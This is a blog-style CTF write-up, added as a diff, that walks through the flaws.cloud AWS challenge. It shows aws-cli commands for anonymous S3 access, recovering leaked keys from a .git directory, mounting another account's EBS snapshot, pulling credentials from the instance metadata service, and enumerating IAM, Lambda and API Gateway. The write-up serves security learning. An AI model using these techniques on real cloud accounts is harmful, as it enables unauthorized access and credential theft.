@@ -1,0 +1,303 @@
+I"�Y<p>In the past week, I’ve been spending my time playing around with cloud services, deploying random stuff just to try and figure out how it’s being used.
+I also wanted to have a vulnerable environment to try and extract something that isn’t usually made available.
+It was then when I stumbled across this <code class="language-plaintext highlighter-rouge">flaws.cloud</code>.</p>
+
+<p>It is basically a cloud CTF, deployed on AWS. Explains about some common misconfigurations and how to take advantage of those mistakes.</p>
+
+<h1 id="lets-start-with-level-1">Let’s start with Level 1</h1>
+
+<h3 id="finding-the-subdomain-that-contains-s3-bucket-for-flawscloud">Finding the subdomain that contains s3 bucket for <code class="language-plaintext highlighter-rouge">flaws.cloud</code></h3>
+
+<ul>
+  <li>AWS S3 buckets follow this pattern</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bucket-name.s3.region.amazonaws.com
+bucket-name.s3.amazonaws.com
+</code></pre></div></div>
+
+<p>In this case, a little bit of google dorking will be enough</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flaws.cloud site:s3.amazonaws.com
+</code></pre></div></div>
+
+<p><strong>S3 Buckets should configured so that they are not publicly available. If the bucket policy is modified to allow everybody “s3:GetObject” privilege, then anyone can access the bucket.</strong></p>
+
+<p>The first link had the contents of the s3 bucket in XML format
+I thought I’ll be able to find something interesting in robots.txt file…
+<img src="/assets/images/flaws-cloud/xml-in-bucket.png" alt="" /></p>
+
+<p>but…
+<img src="/assets/images/flaws-cloud/robots-contents.png" alt="" /></p>
+
+<p>Looking further I found something that actually was a hint
+<img src="/assets/images/flaws-cloud/actual-hint.png" alt="" />
+<strong>secret-dd02c7c.html</strong> was the page I was looking for.
+That page gave me the link to the <strong>Second Level</strong></p>
+
+<h1 id="levelling-up-level-2">Levelling up (Level 2)</h1>
+
+<p>For this challenge, use of <code class="language-plaintext highlighter-rouge">aws-cli</code> was required.</p>
+
+<p>Setting it up is fairly easy, take the <strong>Secret Key</strong> and <strong>Access Key</strong> from your own AWS account and use those to configure awscli profile</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws <span class="nt">--profile</span> configure &lt;profile-name&gt;
+</code></pre></div></div>
+
+<p>After that just enter the keys and an output format.</p>
+
+<p>Now, that we have an AWS account and the bucket url we can try to list the contents of the bucket.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws s3 <span class="nt">--profile</span> &lt;profile-name&gt; <span class="nb">ls </span>s3://&lt;bucket-url&gt;
+</code></pre></div></div>
+
+<p>The contents of this bucket practically showed me the way to level 3.</p>
+
+<h1 id="reached-level-3">Reached Level 3</h1>
+
+<p>Heading over to the url we’re provided, it’s pretty obvious that there’s a .git directory inside that bucket
+<img src="/assets/images/flaws-cloud/git-directory-xml.png" alt="" /></p>
+
+<p>Then I downloaded the entire bucket, so that I can extract something from the .git directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws s3 <span class="nb">sync </span>s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ <span class="nb">.</span> <span class="nt">--no-sign-request</span> <span class="nt">--region</span> us-east-1
+</code></pre></div></div>
+
+<p>By the way, we need to add this <strong>–no-sign-request</strong> flag because credentials were not loaded while making the request, probably because the bucket didn’t require us to have any.</p>
+
+<p>I used <a href="https://github.com/internetwache/GitTools.git">GitTools</a> to extract information from the .git directory. This game me the AWS access key for “Scott Flaws” account. I put those in <code class="language-plaintext highlighter-rouge">~/.aws/credentials</code> file and guess what, those keys weren’t revoked and now I have access to his account! That was easy.
+The first thing I did after acquiring keys to his account, listed some buckets!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali:level_3/ <span class="o">(</span>b64c8dc✗<span class="o">)</span> <span class="nv">$ </span>aws s3 <span class="nt">--profile</span> scott_flaws <span class="nb">ls
+</span>2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
+2017-05-29 12:34:53 config-bucket-975426262029
+2017-02-12 15:03:24 flaws-logs
+2017-02-04 22:40:07 flaws.cloud
+2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
+2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
+2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
+</code></pre></div></div>
+
+<p>Looks like I have found the way for all the levels.</p>
+
+<p><em>SPOILER ALERT</em> I didn’t have enough permissions to access some of those buckets. But bucket 4 was available.</p>
+
+<h1 id="moving-on-to-level-4">Moving on to Level 4</h1>
+
+<p>To clear this level, We have to get access to a webpage at <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud"></a></p>
+
+<p><strong>A snapshot of that EC2 instance was taken right after setting up nginx on that website.</strong></p>
+
+<p>Now even I am not able to access the s3 buckets, so the next thing that comes to my mind are EC2 Instances. In the level description it is also mentioned that a <strong>snapshot was taken</strong> right after nginx was setup on that instance.
+Some EC2 instacnes aren’t made public and are only accessible by some selected accounts.</p>
+
+<p>So to find the snapshot first I had to somehow list the snapshots that user account has access to.</p>
+
+<p>This is where I had to explore the aws cli a little more.
+There are tons of commands in aws cli, here is the one to enumerate user details.</p>
+
+<h3 id="sts-security-token-service">sts (Security Token Service)</h3>
+
+<p>According to AWS docs:</p>
+
+<blockquote>
+  <p>Security Token Service (STS) enables you to request temporary, limited-privilege credentials for Identity and Access Management (IAM) users or for users that you authenticate (federated users).</p>
+</blockquote>
+
+<p>I’m going to use get-caller-identity to find the details of the IAM user or role whose credentials are used to run the aws command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># to find the owner-id, so that I can filter the snapshots</span>
+aws <span class="nt">--profile</span> &lt;compromised-account&gt; sts get-caller-identity
+
+aws <span class="nt">--profile</span> &lt;compromised-account&gt; ec2 describe-snapshots <span class="nt">--owner-id</span> &lt;compromised-owner-id&gt; <span class="nt">--region</span> &lt;region-name-compromised-account&gt;
+</code></pre></div></div>
+
+<p><img src="/assets/images/flaws-cloud/get-caller-identity.png" alt="" /></p>
+
+<p>Now that I have the “SnapshotID” I can attach this snapshot as an EBS volume on my own instance.</p>
+
+<h3 id="creating-ebs-volume-from-snapshotid">Creating EBS Volume from SnapshotID</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws <span class="nt">--profile</span> &lt;own-account&gt; ec2 create-volume <span class="nt">--availability-zone</span> &lt;snapshot-availability-zone&gt; <span class="nt">--region</span> &lt;snapshot-region&gt; <span class="nt">--snapshot-id</span> &lt;snapshot-id&gt;
+</code></pre></div></div>
+
+<p>Then I just log into my instance using my SSH Key, mount the attached EBS volume and now I can freely move around that snapshot until I find something interesting, like this <strong>setupNginx.sh</strong> script lying inside the user’s home directory.</p>
+
+<p>It has the required credentials required for unlocking level 5 webpage</p>
+
+<h1 id="unlocked-level-5">Unlocked Level 5</h1>
+
+<p>There’s this line, probably a hint for this level.</p>
+
+<blockquote>
+  <p>On cloud services, including AWS, the IP 169.254.169.254 is magical. It’s the metadata service.</p>
+</blockquote>
+
+<p>Basically, this exists so that the cloud providers can retrieve user data and data about their own instances. This can easily be accessed locally from an authenticated account.
+It is mentioned in the AWS docs how to access this meta-data for a specific instance. After a little bit of googling I found the address where user credentials are generally stored.</p>
+
+<p><img src="/assets/images/flaws-cloud/found-metadata.png" alt="" /></p>
+
+<p>Found another set of creds inside iam/security-credentials, fed those to my aws cli and was able to access another account!</p>
+
+<p>Then I took the level-6 bucket name from “Scott’s” account, tried to list it’s contents from this account and guess what, I have enough privileges to do that. This gave me the exact endpoint where the index.html of level-6 is located.</p>
+
+<p>Here are some common techniques being used to ensure security of this metadata.</p>
+
+<ul>
+  <li>
+    <p>Google has certain constraints on the access such as requiring it to use <code class="language-plaintext highlighter-rouge">Metadata-Flavor: Google</code> as an HTTP header and refusing connections with <code class="language-plaintext highlighter-rouge">X-Forwaded-For</code> header for obvious reasons.</p>
+  </li>
+  <li>
+    <p>AWS has created this IDMSv2 that required special headers, a challenge &amp; a response and some more protections, although it’s upto the accounts to enforce this.</p>
+  </li>
+  <li>
+    <p>Ensure applications don’t allow access to this magic IP (169.254.169.254) and IAM roles are as restricted as possible.</p>
+  </li>
+</ul>
+
+<h1 id="the-final-level---level-6">The final level - Level 6</h1>
+
+<p>In this challenge, I probably had to look around in a certain user’s account and find a way to Level 7, which is the finish line.</p>
+
+<p>First things first, <strong>finding this users’s details</strong>
+This level already provided me with a set of access keys for an account, so I set those up with aws cli and…</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali:level_6/ <span class="nv">$ </span>aws <span class="nt">--profile</span> level7_flaws iam get-user
+<span class="o">{</span>
+    <span class="s2">"User"</span>: <span class="o">{</span>
+        <span class="s2">"Path"</span>: <span class="s2">"/"</span>,
+        <span class="s2">"UserName"</span>: <span class="s2">"Level6"</span>,
+        <span class="s2">"UserId"</span>: <span class="s2">"AIDAIRMDOSCWGLCDWOG6A"</span>,
+        <span class="s2">"Arn"</span>: <span class="s2">"arn:aws:iam::975426262029:user/Level6"</span>,
+        <span class="s2">"CreateDate"</span>: <span class="s2">"2017-02-26T23:11:16Z"</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Next checked user permissions, to check what this account has access to.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali:level_6/ <span class="nv">$ </span>aws <span class="nt">--profile</span> level7_flaws iam list-attached-user-policies <span class="nt">--user-name</span> Level6
+<span class="o">{</span>
+    <span class="s2">"AttachedPolicies"</span>: <span class="o">[</span>
+        <span class="o">{</span>
+            <span class="s2">"PolicyName"</span>: <span class="s2">"list_apigateways"</span>,
+            <span class="s2">"PolicyArn"</span>: <span class="s2">"arn:aws:iam::975426262029:policy/list_apigateways"</span>
+        <span class="o">}</span>,
+        <span class="o">{</span>
+            <span class="s2">"PolicyName"</span>: <span class="s2">"MySecurityAudit"</span>,
+            <span class="s2">"PolicyArn"</span>: <span class="s2">"arn:aws:iam::975426262029:policy/MySecurityAudit"</span>
+        <span class="o">}</span>
+    <span class="o">]</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p><strong>SecurityAudit</strong> gives permissions to monitor accounts for compliance with security requirements. So this account has access to logs and events to investigate potential security breaches or potential malicious activity, seems like it has access to a lot of information.
+It even gives permissions to enumerate the lambda functions, and that’s exactly what I’m going to do.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali:flaws.cloud/ <span class="nv">$ </span>aws <span class="nt">--region</span> us-west-2 <span class="nt">--profile</span> level7_flaws lambda list-functions
+<span class="o">{</span>
+    <span class="s2">"Functions"</span>: <span class="o">[</span>
+        <span class="o">{</span>
+            <span class="s2">"FunctionName"</span>: <span class="s2">"Level6"</span>,
+            <span class="s2">"FunctionArn"</span>: <span class="s2">"arn:aws:lambda:us-west-2:975426262029:function:Level6"</span>,
+            <span class="s2">"Runtime"</span>: <span class="s2">"python2.7"</span>,
+            <span class="s2">"Role"</span>: <span class="s2">"arn:aws:iam::975426262029:role/service-role/Level6"</span>,
+            <span class="s2">"Handler"</span>: <span class="s2">"lambda_function.lambda_handler"</span>,
+            <span class="s2">"CodeSize"</span>: 282,
+            <span class="s2">"Description"</span>: <span class="s2">"A starter AWS Lambda function."</span>,
+            <span class="s2">"Timeout"</span>: 3,
+            <span class="s2">"MemorySize"</span>: 128,
+            <span class="s2">"LastModified"</span>: <span class="s2">"2017-02-27T00:24:36.054+0000"</span>,
+            <span class="s2">"CodeSha256"</span>: <span class="s2">"2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw="</span>,
+            <span class="s2">"Version"</span>: <span class="s2">"</span><span class="nv">$LATEST</span><span class="s2">"</span>,
+            <span class="s2">"TracingConfig"</span>: <span class="o">{</span>
+                <span class="s2">"Mode"</span>: <span class="s2">"PassThrough"</span>
+            <span class="o">}</span>,
+            <span class="s2">"RevisionId"</span>: <span class="s2">"98033dfd-defa-41a8-b820-1f20add9c77b"</span>,
+            <span class="s2">"PackageType"</span>: <span class="s2">"Zip"</span>,
+            <span class="s2">"Architectures"</span>: <span class="o">[</span>
+                <span class="s2">"x86_64"</span>
+            <span class="o">]</span>
+        <span class="o">}</span>
+    <span class="o">]</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Running that function…</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali:flaws.cloud/ <span class="nv">$ </span>aws <span class="nt">--region</span> us-west-2 <span class="nt">--profile</span> level7_flaws lambda get-policy <span class="nt">--function-name</span> Level6
+<span class="o">{</span>
+    <span class="s2">"Policy"</span>: <span class="s2">"{</span><span class="se">\"</span><span class="s2">Version</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">2012-10-17</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Id</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">default</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Statement</span><span class="se">\"</span><span class="s2">:[{</span><span class="se">\"</span><span class="s2">Sid</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">904610a93f593b76ad66ed6ed82c0a8b</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Effect</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">Allow</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Principal</span><span class="se">\"</span><span class="s2">:{</span><span class="se">\"</span><span class="s2">Service</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">apigateway.amazonaws.com</span><span class="se">\"</span><span class="s2">},</span><span class="se">\"</span><span class="s2">Action</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">lambda:InvokeFunction</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Resource</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">arn:aws:lambda:us-west-2:975426262029:function:Level6</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">Condition</span><span class="se">\"</span><span class="s2">:{</span><span class="se">\"</span><span class="s2">ArnLike</span><span class="se">\"</span><span class="s2">:{</span><span class="se">\"</span><span class="s2">AWS:SourceArn</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6</span><span class="se">\"</span><span class="s2">}}}]}"</span>,
+    <span class="s2">"RevisionId"</span>: <span class="s2">"98033dfd-defa-41a8-b820-1f20add9c77b"</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>This verifies that we have the ability to execute the function “arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6” “s33ppypa75” is the rest-api-id that be used with the resource we have access to due to “list_apigateway” policy.</p>
+
+<p>Now, remember there was another custom policy associated with this account I looked into that too using that’s policy ID.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali:level_6/ <span class="nv">$ </span>aws <span class="nt">--profile</span> level7_flaws iam get-policy <span class="nt">--policy-arn</span> arn:aws:iam::975426262029:policy/list_apigateways
+<span class="o">{</span>
+    <span class="s2">"Policy"</span>: <span class="o">{</span>
+        <span class="s2">"PolicyName"</span>: <span class="s2">"list_apigateways"</span>,
+        <span class="s2">"PolicyId"</span>: <span class="s2">"ANPAIRLWTQMGKCSPGTAIO"</span>,
+        <span class="s2">"Arn"</span>: <span class="s2">"arn:aws:iam::975426262029:policy/list_apigateways"</span>,
+        <span class="s2">"Path"</span>: <span class="s2">"/"</span>,
+        <span class="s2">"DefaultVersionId"</span>: <span class="s2">"v4"</span>,
+        <span class="s2">"AttachmentCount"</span>: 1,
+        <span class="s2">"PermissionsBoundaryUsageCount"</span>: 0,
+        <span class="s2">"IsAttachable"</span>: <span class="nb">true</span>,
+        <span class="s2">"Description"</span>: <span class="s2">"List apigateways"</span>,
+        <span class="s2">"CreateDate"</span>: <span class="s2">"2017-02-20T01:45:17Z"</span>,
+        <span class="s2">"UpdateDate"</span>: <span class="s2">"2017-02-20T01:48:17Z"</span>,
+        <span class="s2">"Tags"</span>: <span class="o">[]</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+kali:level_6/ <span class="nv">$ </span>aws <span class="nt">--profile</span> level7_flaws iam get-policy-version <span class="nt">--policy-arn</span> arn:aws:iam::975426262029:policy/list_apigateways <span class="nt">--version-id</span> v4
+<span class="o">{</span>
+    <span class="s2">"PolicyVersion"</span>: <span class="o">{</span>
+        <span class="s2">"Document"</span>: <span class="o">{</span>
+            <span class="s2">"Version"</span>: <span class="s2">"2012-10-17"</span>,
+            <span class="s2">"Statement"</span>: <span class="o">[</span>
+                <span class="o">{</span>
+                    <span class="s2">"Action"</span>: <span class="o">[</span>
+                        <span class="s2">"apigateway:GET"</span>
+                    <span class="o">]</span>,
+                    <span class="s2">"Effect"</span>: <span class="s2">"Allow"</span>,
+                    <span class="s2">"Resource"</span>: <span class="s2">"arn:aws:apigateway:us-west-2::/restapis/*"</span>
+                <span class="o">}</span>
+            <span class="o">]</span>
+        <span class="o">}</span>,
+        <span class="s2">"VersionId"</span>: <span class="s2">"v4"</span>,
+        <span class="s2">"IsDefaultVersion"</span>: <span class="nb">true</span>,
+        <span class="s2">"CreateDate"</span>: <span class="s2">"2017-02-20T01:48:17Z"</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>According to this response, we can call “apigateway:GET” on “arn:aws:apigateway:us-west-2::/restapis/*” We can use the information obtained from enumerating the resources available with “SecurityAudit” policy</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali:flaws.cloud/ <span class="nv">$ </span>aws <span class="nt">--profile</span> level7_flaws <span class="nt">--region</span> us-west-2 apigateway get-stages <span class="nt">--rest-api-id</span> <span class="s2">"s33ppypa75"</span>
+<span class="o">{</span>
+    <span class="s2">"item"</span>: <span class="o">[</span>
+        <span class="o">{</span>
+            <span class="s2">"deploymentId"</span>: <span class="s2">"8gppiv"</span>,
+            <span class="s2">"stageName"</span>: <span class="s2">"Prod"</span>,
+            <span class="s2">"cacheClusterEnabled"</span>: <span class="nb">false</span>,
+            <span class="s2">"cacheClusterStatus"</span>: <span class="s2">"NOT_AVAILABLE"</span>,
+            <span class="s2">"methodSettings"</span>: <span class="o">{}</span>,
+            <span class="s2">"tracingEnabled"</span>: <span class="nb">false</span>,
+            <span class="s2">"createdDate"</span>: 1488155168,
+            <span class="s2">"lastUpdatedDate"</span>: 1488155168
+        <span class="o">}</span>
+    <span class="o">]</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Lambda functions are called using that rest-api-id, stage name, region and resource like https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6</p>
+:ET
